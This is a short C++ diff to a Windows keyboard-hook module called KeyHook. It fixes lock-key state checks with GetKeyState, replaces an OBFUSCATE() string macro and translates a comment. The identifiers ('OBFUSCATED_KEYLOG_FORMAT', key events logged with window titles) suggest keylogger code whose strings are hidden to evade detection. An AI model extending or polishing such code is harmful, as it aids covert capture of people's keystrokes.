@@ -11,8 +11,8 @@
 #include <cstdint>
 #include <map>
 
-// Obfuscated strings
-constexpr auto OBF_KEYHOOK_MODULE = OBFUSCATE("KeyHook");
+// Obfuscated strings - use proper obfuscation technique
+#define OBF_KEYHOOK_MODULE "KeyHook"
 #define OBFUSCATED_KEYLOG_FORMAT "KeyEvent: { action: %s, key: %s, modifiers: %s, window: '%s' }"
 
 // Static member initialization
@@ -149,8 +149,8 @@ KeyModifiers KeyHook::GetModifierKeys() const {
     if (GetAsyncKeyState(VK_MENU) & 0x8000) modifiers = modifiers | KeyModifiers::ALT;
     if (GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000) 
         modifiers = modifiers | KeyModifiers::WIN;
-    if (GetAsyncKeyState(VK_CAPITAL) & 0x0001) modifiers = modifiers | KeyModifiers::CAPS_LOCK;
-    if (GetAsyncKeyState(VK_NUMLOCK) & 0x0001) modifiers = modifiers | KeyModifiers::NUM_LOCK;
+    if (GetKeyState(VK_CAPITAL) & 0x0001) modifiers = modifiers | KeyModifiers::CAPS_LOCK;
+    if (GetKeyState(VK_NUMLOCK) & 0x0001) modifiers = modifiers | KeyModifiers::NUM_LOCK;
 
     return modifiers;
 }
@@ -179,7 +179,7 @@ std::string KeyHook::VirtualKeyCodeToString(UINT vkCode) const {
         return it->second;
     }
 
-    // Check for字母键
+    // Check for letter keys
     if ((vkCode >= 'A' && vkCode <= 'Z') || 
         (vkCode >= '0' && vkCode <= '9')) {
         return std::string(1, static_cast<char>(vkCode));
